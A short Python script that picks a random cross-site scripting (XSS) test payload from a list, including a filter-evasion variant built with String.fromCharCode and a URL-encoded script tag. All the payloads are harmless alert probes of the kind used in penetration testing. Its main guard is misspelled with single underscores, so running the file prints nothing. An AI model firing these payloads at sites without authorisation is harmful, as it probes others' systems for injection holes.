import random
import string

def generate_payload():
    base_payload = "<script>alert('XSS');</script>"
    
    evasion_payload = (
        "<script>alert(String.fromCharCode(" +
        ",".join(str(ord(c)) for c in "XSS") + "));</script>"
    )
    
    payloads = [
        base_payload,
        evasion_payload,
        "'';!--\"<XSS>=&{()};",
        "javascript:alert(1)",
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
    ]
    
    return random.choice(payloads)

if _name_ == "_main_":
    print(generate_payload())
